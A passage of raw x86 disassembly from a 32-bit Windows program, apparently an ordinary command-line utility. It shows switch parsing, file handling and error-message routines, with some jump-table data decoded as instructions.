  408031:	add    esp,0x8
  408034:	call   0x40d100
  408039:	call   0x407e10
  40803e:	mov    DWORD PTR ds:0x40e654,0x2
  408048:	mov    esi,0x1
  40804d:	mov    DWORD PTR [ebp-0x278],esi
  408053:	cmp    esi,edi
  408055:	jge    0x408150
  40805b:	lea    ebx,[ebx+esi*4]
  40805e:	mov    ecx,DWORD PTR [ebx]
  408060:	movzx  eax,WORD PTR [ecx]
  408063:	cmp    eax,0x2d
  408066:	je     0x408071
  408068:	cmp    eax,0x2f
  40806b:	jne    0x408144
  408071:	push   0x4013a0
  408076:	lea    eax,[ecx+0x2]
  408079:	push   eax
  40807a:	call   DWORD PTR ds:0x4244bc
  408080:	add    esp,0x8
  408083:	test   eax,eax
  408085:	jne    0x408091
  408087:	mov    ds:0x40e654,eax
  40808c:	jmp    0x40811c
  408091:	push   0x4013c4
  408096:	mov    eax,DWORD PTR [ebx]
  408098:	add    eax,0x2
  40809b:	push   eax
  40809c:	call   DWORD PTR ds:0x4244bc
  4080a2:	add    esp,0x8
  4080a5:	test   eax,eax
  4080a7:	jne    0x4080b5
  4080a9:	mov    DWORD PTR ds:0x40e654,0x1
  4080b3:	jmp    0x40811c
  4080b5:	push   0x4013ec
  4080ba:	mov    eax,DWORD PTR [ebx]
  4080bc:	add    eax,0x2
  4080bf:	push   eax
  4080c0:	call   DWORD PTR ds:0x4244bc
  4080c6:	add    esp,0x8
  4080c9:	test   eax,eax
  4080cb:	jne    0x4080d9
  4080cd:	mov    DWORD PTR ds:0x40e654,0x2
  4080d7:	jmp    0x40811c
  4080d9:	push   0x401410
  4080de:	mov    eax,DWORD PTR [ebx]
  4080e0:	add    eax,0x2
  4080e3:	push   eax
  4080e4:	call   DWORD PTR ds:0x4244bc
  4080ea:	add    esp,0x8
  4080ed:	test   eax,eax
  4080ef:	jne    0x4080fd
  4080f1:	mov    DWORD PTR ds:0x40e654,0x3
  4080fb:	jmp    0x40811c
  4080fd:	push   0x401434
  408102:	mov    eax,DWORD PTR [ebx]
  408104:	add    eax,0x2
  408107:	push   eax
  408108:	call   DWORD PTR ds:0x4244bc
  40810e:	add    esp,0x8
  408111:	test   eax,eax
  408113:	jne    0x408144
  408115:	mov    BYTE PTR ds:0x40e641,0x1
  40811c:	mov    eax,edi
  40811e:	sub    eax,esi
  408120:	lea    eax,[eax*4-0x4]
  408127:	push   eax
  408128:	lea    eax,[ebx+0x4]
  40812b:	push   eax
  40812c:	push   ebx
  40812d:	call   DWORD PTR ds:0x4243b0
  408133:	add    esp,0xc
  408136:	dec    edi
  408137:	dec    esi
  408138:	mov    DWORD PTR [ebp-0x278],esi
  40813e:	mov    DWORD PTR [ebp-0x27c],edi
  408144:	inc    esi
  408145:	mov    ebx,DWORD PTR [ebp-0x280]
  40814b:	jmp    0x40804d
  408150:	cmp    DWORD PTR ds:0x40e654,0x3
  408157:	jne    0x408171
  408159:	call   0x4077f0
  40815e:	test   al,al
  408160:	jne    0x408171
  408162:	mov    edx,0x401458
  408167:	mov    ecx,0x1199
  40816c:	call   0x4071e0
  408171:	call   0x4077c0
  408176:	test   al,al
  408178:	jne    0x408185
  40817a:	push   0x407e80
  40817f:	call   DWORD PTR ds:0x42430c
  408185:	cmp    BYTE PTR ds:0x40e641,0x0
  40818c:	je     0x408196
  40818e:	xor    eax,eax
  408190:	mov    ds:0x0,ax
  408196:	push   0x4074c0
  40819b:	push   0x2
  40819d:	call   DWORD PTR ds:0x424398
  4081a3:	add    esp,0x8
  4081a6:	cmp    edi,0x1
  4081a9:	jne    0x4081b0
  4081ab:	call   0x408740
  4081b0:	push   0x104
  4081b5:	push   0x40e438
  4081ba:	call   DWORD PTR ds:0x4243b4
  4081c0:	add    esp,0x8
  4081c3:	mov    ecx,0x40e438
  4081c8:	call   0x40a2b0
  4081cd:	mov    edx,ebx
  4081cf:	mov    ecx,edi
  4081d1:	call   0x408930
  4081d6:	mov    esi,eax
  4081d8:	test   esi,esi
  4081da:	jne    0x4081e1
  4081dc:	call   0x408740
  4081e1:	call   0x4086f0
  4081e6:	cmp    DWORD PTR ds:0x416f38,0x0
  4081ed:	je     0x4081f7
  4081ef:	mov    ebx,DWORD PTR ds:0x416f44
  4081f5:	jmp    0x408200
  4081f7:	mov    ebx,DWORD PTR ds:0x40e02c
  4081fd:	dec    ebx
  4081fe:	mov    edi,edi
  408200:	mov    ecx,esi
  408202:	call   0x40a2b0
  408207:	mov    edx,0x408e00
  40820c:	mov    ecx,esi
  40820e:	call   0x40a2f0
  408213:	test   eax,eax
  408215:	jne    0x40822b
  408217:	call   DWORD PTR ds:0x4243b8
  40821d:	push   DWORD PTR [eax]
  40821f:	mov    edx,esi
  408221:	mov    ecx,0x5e2
  408226:	call   0x407010
  40822b:	call   0x408800
  408230:	mov    esi,eax
  408232:	test   esi,esi
  408234:	jne    0x408200
  408236:	cmp    BYTE PTR ds:0x40e02a,al
  40823c:	je     0x408245
  40823e:	push   eax
  40823f:	call   DWORD PTR ds:0x424394
  408245:	cmp    BYTE PTR ds:0x40e02b,0x0
  40824c:	je     0x40828a
  40824e:	mov    BYTE PTR ds:0x40e691,0x1
  408255:	push   DWORD PTR ds:0x40e644
  40825b:	call   DWORD PTR ds:0x42438c
  408261:	add    esp,0x4
  408264:	cmp    eax,0xffffffff
  408267:	jne    0x40828a
  408269:	mov    edi,DWORD PTR ds:0x4243b8
  40826f:	call   edi
  408271:	cmp    DWORD PTR [eax],0x2
  408274:	je     0x408290
  408276:	call   edi
  408278:	push   DWORD PTR [eax]
  40827a:	mov    edx,DWORD PTR ds:0x40e644
  408280:	mov    ecx,0x5e2
  408285:	call   0x407010
  40828a:	mov    edi,DWORD PTR ds:0x4243b8
  408290:	call   0x405a30
  408295:	call   0x40b750
  40829a:	call   0x404ac0
  40829f:	call   0x40ba10
  4082a4:	call   0x404bb0
  4082a9:	mov    ecx,ebx
  4082ab:	call   0x4087d0
  4082b0:	call   0x408800
  4082b5:	mov    esi,eax
  4082b7:	mov    ecx,esi
  4082b9:	call   0x40a2b0
  4082be:	mov    edx,0x4084e0
  4082c3:	mov    ecx,esi
  4082c5:	call   0x40a2f0
  4082ca:	test   eax,eax
  4082cc:	jne    0x4082de
  4082ce:	call   edi
  4082d0:	push   DWORD PTR [eax]
  4082d2:	mov    edx,esi
  4082d4:	mov    ecx,0x5e2
  4082d9:	call   0x407010
  4082de:	call   0x408800
  4082e3:	mov    esi,eax
  4082e5:	test   esi,esi
  4082e7:	jne    0x4082b7
  4082e9:	cmp    BYTE PTR ds:0x40e692,al
  4082ef:	je     0x4082fe
  4082f1:	push   0x4014b8
  4082f6:	call   0x40d1c0
  4082fb:	add    esp,0x4
  4082fe:	call   0x40bf60
  408303:	call   0x40b5b0
  408308:	call   0x4036f0
  40830d:	call   0x404e00
  408312:	call   0x40bc60
  408317:	call   0x405b40
  40831c:	mov    BYTE PTR ds:0x40e691,0x0
  408323:	cmp    BYTE PTR ds:0x40e427,0x0
  40832a:	jne    0x408372
  40832c:	mov    ecx,ebx
  40832e:	call   0x4087d0
  408333:	call   0x408800
  408338:	mov    esi,eax
  40833a:	lea    ebx,[ebx+0x0]
  408340:	mov    ecx,esi
  408342:	call   0x40a2b0
  408347:	mov    edx,0x408600
  40834c:	mov    ecx,esi
  40834e:	call   0x40a2f0
  408353:	test   eax,eax
  408355:	jne    0x408367
  408357:	call   edi
  408359:	push   DWORD PTR [eax]
  40835b:	mov    edx,esi
  40835d:	mov    ecx,0x5e2
  408362:	call   0x407010
  408367:	call   0x408800
  40836c:	mov    esi,eax
  40836e:	test   esi,esi
  408370:	jne    0x408340
  408372:	push   0x0
  408374:	call   DWORD PTR ds:0x424394
  40837a:	lea    eax,[ebp-0x568]
  408380:	push   eax
  408381:	lea    edx,[ebp-0x274]
  408387:	mov    ecx,DWORD PTR [ebp-0x14]
  40838a:	call   0x407ed0
  40838f:	add    esp,0x4
  408392:	ret    
  408393:	mov    esp,DWORD PTR [ebp-0x18]
  408396:	mov    esi,DWORD PTR [ebp-0x268]
  40839c:	push   esi
  40839d:	push   DWORD PTR [ebp-0x270]
  4083a3:	push   DWORD PTR [ebp-0x274]
  4083a9:	push   0x401530
  4083ae:	call   0x40d1c0
  4083b3:	add    esp,0x10
  4083b6:	push   0x1c
  4083b8:	lea    eax,[ebp-0x29c]
  4083be:	push   eax
  4083bf:	push   esi
  4083c0:	call   DWORD PTR ds:0x424310
  4083c6:	test   eax,eax
  4083c8:	je     0x408400
  4083ca:	push   0x104
  4083cf:	lea    eax,[ebp-0x224]
  4083d5:	push   eax
  4083d6:	push   DWORD PTR [ebp-0x298]
  4083dc:	call   DWORD PTR ds:0x424314
  4083e2:	test   eax,eax
  4083e4:	je     0x408400
  4083e6:	lea    eax,[ebp-0x224]
  4083ec:	push   eax
  4083ed:	push   DWORD PTR [ebp-0x298]
  4083f3:	push   0x40162c
  4083f8:	call   0x40d1c0
  4083fd:	add    esp,0xc
  408400:	mov    edi,DWORD PTR [ebp-0x264]
  408406:	push   edi
  408407:	push   0x401648
  40840c:	call   0x40d1c0
  408411:	add    esp,0x8
  408414:	xor    esi,esi
  408416:	test   edi,edi
  408418:	je     0x40843a
  40841a:	lea    ebx,[ebx+0x0]
  408420:	push   DWORD PTR [ebp+esi*4-0x260]
  408427:	push   esi
  408428:	push   0x401690
  40842d:	call   0x40d1c0
  408432:	add    esp,0xc
  408435:	inc    esi
  408436:	cmp    esi,edi
  408438:	jb     0x408420
  40843a:	push   DWORD PTR [ebp-0x550]
  408440:	push   DWORD PTR [ebp-0x55c]
  408446:	push   DWORD PTR [ebp-0x554]
  40844c:	push   DWORD PTR [ebp-0x560]
  408452:	push   DWORD PTR [ebp-0x558]
  408458:	push   DWORD PTR [ebp-0x564]
  40845e:	push   DWORD PTR [ebp-0x4dc]
  408464:	push   DWORD PTR [ebp-0x4d8]
  40846a:	push   DWORD PTR [ebp-0x4d4]
  408470:	push   DWORD PTR [ebp-0x4a0]
  408476:	push   DWORD PTR [ebp-0x4d0]
  40847c:	push   DWORD PTR [ebp-0x4ac]
  408482:	push   DWORD PTR [ebp-0x4a8]
  408488:	push   DWORD PTR [ebp-0x4b0]
  40848e:	push   DWORD PTR [ebp-0x4cc]
  408494:	push   DWORD PTR [ebp-0x4c0]
  40849a:	push   DWORD PTR [ebp-0x4c8]
  4084a0:	push   DWORD PTR [ebp-0x4bc]
  4084a6:	push   DWORD PTR [ebp-0x4b4]
  4084ac:	push   DWORD PTR [ebp-0x4c4]
  4084b2:	push   DWORD PTR [ebp-0x4a4]
  4084b8:	push   DWORD PTR [ebp-0x4b8]
  4084be:	push   0x4016d8
  4084c3:	call   0x40d1c0
  4084c8:	add    esp,0x5c
  4084cb:	call   0x40d1a0
  4084d0:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4084d7:	push   0x4
  4084d9:	call   DWORD PTR ds:0x424394
  4084df:	int3   
  4084e0:	push   ebp
  4084e1:	mov    ebp,esp
  4084e3:	push   ebx
  4084e4:	push   esi
  4084e5:	mov    esi,DWORD PTR ds:0x41f368
  4084eb:	push   edi
  4084ec:	test   esi,esi
  4084ee:	je     0x4085d4
  4084f4:	mov    edi,DWORD PTR [ebp+0x8]
  4084f7:	mov    ebx,DWORD PTR ds:0x4244bc
  4084fd:	lea    ecx,[ecx+0x0]
  408500:	lea    eax,[esi+0xc]
  408503:	push   edi
  408504:	push   eax
  408505:	call   ebx
  408507:	add    esp,0x8
  40850a:	test   eax,eax
  40850c:	je     0x40851a
  40850e:	mov    esi,DWORD PTR [esi+0x4]
  408511:	test   esi,esi
  408513:	jne    0x408500
  408515:	jmp    0x4085d4
  40851a:	test   esi,esi
  40851c:	je     0x4085d4
  408522:	movzx  eax,WORD PTR [esi]
  408525:	test   al,0x4
  408527:	jne    0x408534
  408529:	or     eax,0x8
  40852c:	pop    edi
  40852d:	mov    WORD PTR [esi],ax
  408530:	pop    esi
  408531:	pop    ebx
  408532:	pop    ebp
  408533:	ret    
  408534:	mov    ecx,edi
  408536:	call   0x4074e0
  40853b:	cmp    BYTE PTR ds:0x40e692,0x0
  408542:	mov    ds:0x40e8dc,eax
  408547:	je     0x40855c
  408549:	push   eax
  40854a:	push   0x401940
  40854f:	call   0x40d1c0
  408554:	mov    eax,ds:0x40e8dc
  408559:	add    esp,0x8
  40855c:	push   0x0
  40855e:	push   0x40
  408560:	push   0x8000
  408565:	push   eax
  408566:	push   0x40eae8
  40856b:	call   DWORD PTR ds:0x4243bc
  408571:	add    esp,0x14
  408574:	test   eax,eax
  408576:	jne    0x4085e2
  408578:	call   0x4076f0
  40857d:	test   al,al
  40857f:	jne    0x4085a1
  408581:	push   DWORD PTR ds:0x40e8dc
  408587:	call   DWORD PTR ds:0x42441c
  40858d:	push   DWORD PTR ds:0x40eae8
  408593:	call   DWORD PTR ds:0x4243c0
  408599:	add    esp,0x8
  40859c:	pop    edi
  40859d:	pop    esi
  40859e:	pop    ebx
  40859f:	pop    ebp
  4085a0:	ret    
  4085a1:	cmp    BYTE PTR ds:0x40e8cd,0x0
  4085a8:	jne    0x4085af
  4085aa:	call   0x402620
  4085af:	call   0x40acc0
  4085b4:	push   DWORD PTR ds:0x40eae8
  4085ba:	call   DWORD PTR ds:0x4243c0
  4085c0:	push   DWORD PTR ds:0x40e8dc
  4085c6:	call   DWORD PTR ds:0x42441c
  4085cc:	add    esp,0x8
  4085cf:	pop    edi
  4085d0:	pop    esi
  4085d1:	pop    ebx
  4085d2:	pop    ebp
  4085d3:	ret    
  4085d4:	push   0x0
  4085d6:	xor    edx,edx
  4085d8:	mov    ecx,0x5dc
  4085dd:	call   0x407010
  4085e2:	call   DWORD PTR ds:0x4243b8
  4085e8:	push   DWORD PTR [eax]
  4085ea:	mov    edx,DWORD PTR ds:0x40e8dc
  4085f0:	mov    ecx,0x5e2
  4085f5:	call   0x407010
  4085fa:	int3   
  4085fb:	int3   
  4085fc:	int3   
  4085fd:	int3   
  4085fe:	int3   
  4085ff:	int3   
  408600:	push   ebp
  408601:	mov    ebp,esp
  408603:	and    esp,0xfffffff8
  408606:	sub    esp,0x1c
  408609:	push   ebx
  40860a:	push   esi
  40860b:	mov    esi,DWORD PTR ds:0x41f368
  408611:	push   edi
  408612:	mov    edi,DWORD PTR [ebp+0x8]
  408615:	test   esi,esi
  408617:	je     0x408640
  408619:	mov    ebx,DWORD PTR ds:0x4244bc
  40861f:	nop
  408620:	lea    eax,[esi+0xc]
  408623:	push   edi
  408624:	push   eax
  408625:	call   ebx
  408627:	add    esp,0x8
  40862a:	test   eax,eax
  40862c:	je     0x408637
  40862e:	mov    esi,DWORD PTR [esi+0x4]
  408631:	test   esi,esi
  408633:	jne    0x408620
  408635:	jmp    0x408640
  408637:	test   esi,esi
  408639:	je     0x408640
  40863b:	test   BYTE PTR [esi],0x8
  40863e:	jne    0x4086a6
  408640:	push   0x0
  408642:	push   0x10000000
  408647:	push   0x3
  408649:	push   0x0
  40864b:	push   0x0
  40864d:	push   0x40000000
  408652:	push   edi
  408653:	call   DWORD PTR ds:0x424318
  408659:	mov    esi,eax
  40865b:	cmp    esi,0xffffffff
  40865e:	je     0x4086ad
  408660:	lea    eax,[esp+0x10]
  408664:	push   eax
  408665:	lea    eax,[esp+0x1c]
  408669:	push   eax
  40866a:	lea    eax,[esp+0x28]
  40866e:	push   eax
  40866f:	push   esi
  408670:	call   DWORD PTR ds:0x42431c
  408676:	test   eax,eax
  408678:	je     0x4086bb
  40867a:	push   esi
  40867b:	call   DWORD PTR ds:0x424320
  408681:	test   eax,eax
  408683:	je     0x4086c9
  408685:	lea    eax,[esp+0x10]
  408689:	push   eax
  40868a:	lea    eax,[esp+0x1c]
  40868e:	push   eax
  40868f:	lea    eax,[esp+0x28]
  408693:	push   eax
  408694:	push   esi
  408695:	call   DWORD PTR ds:0x424324
  40869b:	test   eax,eax
  40869d:	je     0x4086d7
  40869f:	push   esi
  4086a0:	call   DWORD PTR ds:0x4242d8
  4086a6:	pop    edi
  4086a7:	pop    esi
  4086a8:	pop    ebx
  4086a9:	mov    esp,ebp
  4086ab:	pop    ebp
  4086ac:	ret    
  4086ad:	push   0x0
  4086af:	mov    edx,edi
  4086b1:	mov    ecx,0x5e2
  4086b6:	call   0x407010
  4086bb:	push   0x0
  4086bd:	mov    edx,edi
  4086bf:	mov    ecx,0x5e2
  4086c4:	call   0x407010
  4086c9:	push   0x0
  4086cb:	mov    edx,edi
  4086cd:	mov    ecx,0x5e2
  4086d2:	call   0x407010
  4086d7:	push   0x0
  4086d9:	mov    edx,edi
  4086db:	mov    ecx,0x5e2
  4086e0:	call   0x407010
  4086e5:	int3   
  4086e6:	int3   
  4086e7:	int3   
  4086e8:	int3   
  4086e9:	int3   
  4086ea:	int3   
  4086eb:	int3   
  4086ec:	int3   
  4086ed:	int3   
  4086ee:	int3   
  4086ef:	int3   
  4086f0:	push   ecx
  4086f1:	cmp    BYTE PTR ds:0x40eaf1,0x0
  4086f8:	jne    0x408730
  4086fa:	mov    ecx,0x7d0
  4086ff:	mov    BYTE PTR ds:0x40eaf1,0x1
  408706:	call   0x4096d0
  40870b:	push   eax
  40870c:	push   0x401968
  408711:	call   0x40d1c0
  408716:	push   0x401970
  40871b:	call   0x40d1c0
  408720:	add    esp,0xc
  408723:	push   0x4019a0
  408728:	call   0x40d1c0
  40872d:	add    esp,0x4
  408730:	pop    ecx
  408731:	ret    
  408732:	int3   
  408733:	int3   
  408734:	int3   
  408735:	int3   
  408736:	int3   
  408737:	int3   
  408738:	int3   
  408739:	int3   
  40873a:	int3   
  40873b:	int3   
  40873c:	int3   
  40873d:	int3   
  40873e:	int3   
  40873f:	int3   
  408740:	cmp    BYTE PTR ds:0x40eaf1,0x0
  408747:	push   esi
  408748:	jne    0x40877d
  40874a:	mov    ecx,0x7d0
  40874f:	mov    BYTE PTR ds:0x40eaf1,0x1
  408756:	call   0x4096d0
  40875b:	push   eax
  40875c:	push   0x401968
  408761:	call   0x40d1c0
  408766:	push   0x401970
  40876b:	call   0x40d1c0
  408770:	push   0x4019a0
  408775:	call   0x40d1c0
  40877a:	add    esp,0x10
  40877d:	mov    ecx,0x7d1
  408782:	call   0x4096d0
  408787:	push   eax
  408788:	push   0x401a1c
  40878d:	call   0x40d1c0
  408792:	add    esp,0x8
  408795:	mov    esi,0x7d2
  40879a:	lea    ebx,[ebx+0x0]
  4087a0:	mov    ecx,esi
  4087a2:	call   0x4096d0
  4087a7:	push   eax
  4087a8:	push   0x401a28
  4087ad:	call   0x40d1c0
  4087b2:	inc    esi
  4087b3:	add    esp,0x8
  4087b6:	cmp    esi,0x7e8
  4087bc:	jle    0x4087a0
  4087be:	push   0x1
  4087c0:	call   DWORD PTR ds:0x424394
  4087c6:	int3   
  4087c7:	int3   
  4087c8:	int3   
  4087c9:	int3   
  4087ca:	int3   
  4087cb:	int3   
  4087cc:	int3   
  4087cd:	int3   
  4087ce:	int3   
  4087cf:	int3   
  4087d0:	mov    eax,ds:0x416f38
  4087d5:	test   eax,eax
  4087d7:	je     0x4087f1
  4087d9:	push   0x0
  4087db:	push   ecx
  4087dc:	push   eax
  4087dd:	call   DWORD PTR ds:0x4243c4
  4087e3:	add    esp,0xc
  4087e6:	mov    DWORD PTR ds:0x40e02c,0x0
  4087f0:	ret    
  4087f1:	mov    DWORD PTR ds:0x40e02c,ecx
  4087f7:	ret    
  4087f8:	int3   
  4087f9:	int3   
  4087fa:	int3   
  4087fb:	int3   
  4087fc:	int3   
  4087fd:	int3   
  4087fe:	int3   
  4087ff:	int3   
  408800:	mov    ecx,DWORD PTR ds:0x40e02c
  408806:	cmp    ecx,DWORD PTR ds:0x416f3c
  40880c:	jl     0x408811
  40880e:	xor    eax,eax
  408810:	ret    
  408811:	mov    eax,ds:0x416f38
  408816:	test   eax,eax
  408818:	je     0x4088f9
  40881e:	push   ebx
  40881f:	push   esi
  408820:	push   edi
  408821:	push   eax
  408822:	mov    esi,0x423028
  408827:	xor    bh,bh
  408829:	xor    bl,bl
  40882b:	call   DWORD PTR ds:0x4244c4
  408831:	mov    edi,DWORD PTR ds:0x4243cc
  408837:	add    esp,0x4
  40883a:	mov    ds:0x416f44,eax
  40883f:	nop
  408840:	push   DWORD PTR ds:0x416f38
  408846:	call   edi
  408848:	add    esp,0x4
  40884b:	movzx  ecx,ax
  40884e:	test   bl,bl
  408850:	je     0x40886f
  408852:	cmp    ecx,0x5c
  408855:	je     0x4088bd
  408857:	cmp    ecx,0x22
  40885a:	je     0x4088bd
  40885c:	cmp    esi,0x42322e
  408862:	jae    0x40886f
  408864:	mov    eax,0x5c
  408869:	mov    WORD PTR [esi],ax
  40886c:	add    esi,0x2
  40886f:	mov    eax,ecx
  408871:	cmp    eax,0x22
  408874:	jg     0x4088b1
  408876:	je     0x4088a8
  408878:	sub    eax,0x9
  40887b:	cmp    eax,0x17
  40887e:	ja     0x4088bd
  408880:	movzx  eax,BYTE PTR [eax+0x408914]
  408887:	jmp    DWORD PTR [eax*4+0x40890c]
  40888e:	test   bh,bh
  408890:	jne    0x4088bd
  408892:	cmp    esi,0x423028
  408898:	je     0x408840
  40889a:	xor    eax,eax
  40889c:	mov    WORD PTR [esi],ax
  40889f:	mov    eax,0x423028
  4088a4:	pop    edi
  4088a5:	pop    esi
  4088a6:	pop    ebx
  4088a7:	ret    
  4088a8:	test   bh,bh
  4088aa:	sete   bh
  4088ad:	xor    bl,bl
  4088af:	jmp    0x408840
  4088b1:	cmp    eax,0x5c
  4088b4:	je     0x4088d2
  4088b6:	cmp    eax,0xffff
  4088bb:	je     0x4088d9
  4088bd:	cmp    esi,0x42322e
  4088c3:	jae    0x4088cb
  4088c5:	mov    WORD PTR [esi],cx
  4088c8:	add    esi,0x2
  4088cb:	xor    bl,bl
  4088cd:	jmp    0x408840
  4088d2:	mov    bl,0x1
  4088d4:	jmp    0x408840
  4088d9:	mov    eax,ds:0x416f3c
  4088de:	mov    ds:0x40e02c,eax
  4088e3:	xor    eax,eax
  4088e5:	cmp    esi,0x423028
  4088eb:	je     0x4088a4
  4088ed:	pop    edi
  4088ee:	mov    WORD PTR [esi],ax
  4088f1:	pop    esi
  4088f2:	mov    eax,0x423028
  4088f7:	pop    ebx
  4088f8:	ret    
  4088f9:	mov    eax,ds:0x416f40
  4088fe:	inc    ecx
  4088ff:	mov    eax,DWORD PTR [eax+ecx*4-0x4]
  408903:	mov    DWORD PTR ds:0x40e02c,ecx
  408909:	ret    
  40890a:	mov    edi,edi
  40890c:	mov    cs,WORD PTR [eax-0x7742ffc0]
  408912:	inc    eax
  408913:	add    BYTE PTR [eax],al
  408915:	add    BYTE PTR [ecx],al
  408917:	add    BYTE PTR [eax],al
  408919:	add    DWORD PTR [ecx],eax
  40891b:	add    DWORD PTR [ecx],eax
  40891d:	add    DWORD PTR [ecx],eax
  40891f:	add    DWORD PTR [ecx],eax
  408921:	add    DWORD PTR [ecx],eax
  408923:	add    DWORD PTR [ecx],eax
  408925:	add    DWORD PTR [ecx],eax
  408927:	add    DWORD PTR [ecx],eax
  408929:	add    DWORD PTR [ecx],eax
  40892b:	add    ah,cl
  40892d:	int3   
  40892e:	int3   
  40892f:	int3   
  408930:	push   esi
  408931:	push   edi
  408932:	mov    DWORD PTR ds:0x416f3c,ecx
  408938:	mov    DWORD PTR ds:0x416f40,edx
  40893e:	call   0x408800
  408943:	mov    ecx,eax
  408945:	test   ecx,ecx
  408947:	je     0x408c6c
  40894d:	mov    edi,DWORD PTR ds:0x4243d0
  408953:	movzx  eax,WORD PTR [ecx]
  408956:	cmp    eax,0x40
  408959:	jne    0x4089a6
  40895b:	cmp    DWORD PTR ds:0x416f38,0x0
  408962:	jne    0x408cb8
  408968:	cmp    WORD PTR [ecx+0x2],0x0
  40896d:	lea    esi,[ecx+0x2]
  408970:	jne    0x408981
  408972:	call   0x408800
  408977:	mov    esi,eax
  408979:	test   esi,esi
  40897b:	je     0x408cb8
  408981:	push   0x20
  408983:	push   0x401a30
  408988:	push   esi
  408989:	call   edi
  40898b:	add    esp,0xc
  40898e:	mov    ds:0x416f38,eax
  408993:	test   eax,eax
  408995:	je     0x408ca4
  40899b:	inc    DWORD PTR ds:0x416f3c
  4089a1:	jmp    0x408c5d
  4089a6:	cmp    eax,0x2d
  4089a9:	je     0x4089b4
  4089ab:	cmp    eax,0x2f
  4089ae:	jne    0x408c6c
  4089b4:	movzx  eax,WORD PTR [ecx+0x2]
  4089b8:	add    eax,0xffffffc1
  4089bb:	cmp    eax,0x37
  4089be:	ja     0x408c51
  4089c4:	movzx  eax,BYTE PTR [eax+0x408d28]
  4089cb:	jmp    DWORD PTR [eax*4+0x408d08]
  4089d2:	movzx  eax,WORD PTR [ecx+0x4]
  4089d6:	test   ax,ax
  4089d9:	jne    0x4089e7
  4089db:	mov    BYTE PTR ds:0x40e427,0x1
  4089e2:	jmp    0x408c5d
  4089e7:	cmp    eax,0x6f
  4089ea:	jne    0x408c51
  4089f0:	mov    BYTE PTR ds:0x40eaf1,0x1
  4089f7:	jmp    0x408c5d
  4089fc:	cmp    WORD PTR [ecx+0x4],0x0
  408a01:	lea    eax,[ecx+0x4]
  408a04:	jne    0x408a13
  408a06:	call   0x408800
  408a0b:	test   eax,eax
  408a0d:	je     0x408cc9
  408a13:	mov    ecx,eax
  408a15:	call   0x407540
  408a1a:	mov    ds:0x40e644,eax
  408a1f:	jmp    0x408c5d
  408a24:	cmp    WORD PTR [ecx+0x4],0x0
  408a29:	lea    eax,[ecx+0x4]
  408a2c:	jne    0x408a3b
  408a2e:	call   0x408800
  408a33:	test   eax,eax
  408a35:	je     0x408cc9
  408a3b:	cmp    WORD PTR [eax],0x28
  408a3f:	je     0x408a4f
  408a41:	mov    dl,0x1
  408a43:	mov    ecx,eax
  408a45:	call   0x407640
  408a4a:	jmp    0x408c5d
  408a4f:	cmp    WORD PTR [eax+0x2],0x0
  408a54:	lea    esi,[eax+0x2]
  408a57:	jne    0x408a60
  408a59:	call   0x408800
  408a5e:	mov    esi,eax
  408a60:	test   esi,esi
  408a62:	je     0x408c71
  408a68:	mov    ecx,esi
  408a6a:	lea    edx,[ecx+0x2]
  408a6d:	lea    ecx,[ecx+0x0]
  408a70:	mov    ax,WORD PTR [ecx]
  408a73:	add    ecx,0x2
  408a76:	test   ax,ax
  408a79:	jne    0x408a70
  408a7b:	sub    ecx,edx
  408a7d:	sar    ecx,1
  408a7f:	cmp    WORD PTR [esi+ecx*2-0x2],0x29
  408a85:	je     0x408aa0
  408a87:	mov    dl,0x1
  408a89:	mov    ecx,esi
  408a8b:	call   0x407640
  408a90:	call   0x408800
  408a95:	mov    esi,eax
  408a97:	test   esi,esi
  408a99:	jne    0x408a68
  408a9b:	jmp    0x408c71
  408aa0:	cmp    ecx,0x1
  408aa3:	jbe    0x408c5d
  408aa9:	xor    eax,eax
  408aab:	mov    WORD PTR [esi+ecx*2-0x2],ax
  408ab0:	mov    dl,0x1
  408ab2:	mov    ecx,esi
  408ab4:	call   0x407640
  408ab9:	jmp    0x408c5d
  408abe:	movzx  eax,WORD PTR [ecx+0x4]
  408ac2:	cmp    eax,0x76
  408ac5:	ja     0x408cfe
  408acb:	movzx  eax,BYTE PTR [eax+0x408d80]
  408ad2:	jmp    DWORD PTR [eax*4+0x408d60]
  408ad9:	mov    BYTE PTR ds:0x40e413,0x1
  408ae0:	jmp    0x408c5d
  408ae5:	mov    BYTE PTR ds:0x40e42b,0x1
  408aec:	jmp    0x408c5d
  408af1:	mov    BYTE PTR ds:0x40e640,0x1
  408af8:	jmp    0x408c5d
  408afd:	mov    BYTE PTR ds:0x40e426,0x1
  408b04:	jmp    0x408c5d
  408b09:	cmp    WORD PTR [ecx+0x6],0x0
  408b0e:	lea    eax,[ecx+0x6]
  408b11:	mov    BYTE PTR ds:0x40e412,0x1
  408b18:	jne    0x408b1f
  408b1a:	call   0x408800
  408b1f:	test   eax,eax
  408b21:	je     0x408cce
  408b27:	cmp    WORD PTR [eax],0x28
  408b2b:	je     0x408b39
  408b2d:	mov    ecx,eax
  408b2f:	call   0x40c210
  408b34:	jmp    0x408c5d
  408b39:	cmp    WORD PTR [eax+0x2],0x0
  408b3e:	lea    edx,[eax+0x2]
  408b41:	jne    0x408b4a
  408b43:	call   0x408800
  408b48:	mov    edx,eax
  408b4a:	test   edx,edx
  408b4c:	je     0x408c82
  408b52:	mov    ecx,edx
  408b54:	lea    esi,[ecx+0x2]
  408b57:	mov    ax,WORD PTR [ecx]
  408b5a:	add    ecx,0x2
  408b5d:	test   ax,ax
  408b60:	jne    0x408b57
  408b62:	sub    ecx,esi
  408b64:	sar    ecx,1
  408b66:	cmp    WORD PTR [edx+ecx*2-0x2],0x29
  408b6c:	je     0x408b85
  408b6e:	mov    ecx,edx
  408b70:	call   0x40c210
  408b75:	call   0x408800
  408b7a:	mov    edx,eax
  408b7c:	test   edx,edx
  408b7e:	jne    0x408b52
  408b80:	jmp    0x408c82
  408b85:	cmp    ecx,0x1
  408b88:	jbe    0x408c5d
  408b8e:	xor    eax,eax
  408b90:	mov    WORD PTR [edx+ecx*2-0x2],ax
  408b95:	mov    ecx,edx
  408b97:	call   0x40c210
  408b9c:	jmp    0x408c5d
  408ba1:	cmp    WORD PTR [ecx+0x6],0x0
  408ba6:	lea    eax,[ecx+0x6]
  408ba9:	jne    0x408bb0
  408bab:	call   0x408800
  408bb0:	test   eax,eax
  408bb2:	je     0x408cdf
  408bb8:	cmp    WORD PTR [eax],0x28
  408bbc:	je     0x408bcc
  408bbe:	xor    dl,dl
  408bc0:	mov    ecx,eax
  408bc2:	call   0x407640
  408bc7:	jmp    0x408c5d
  408bcc:	cmp    WORD PTR [eax+0x2],0x0
  408bd1:	lea    esi,[eax+0x2]
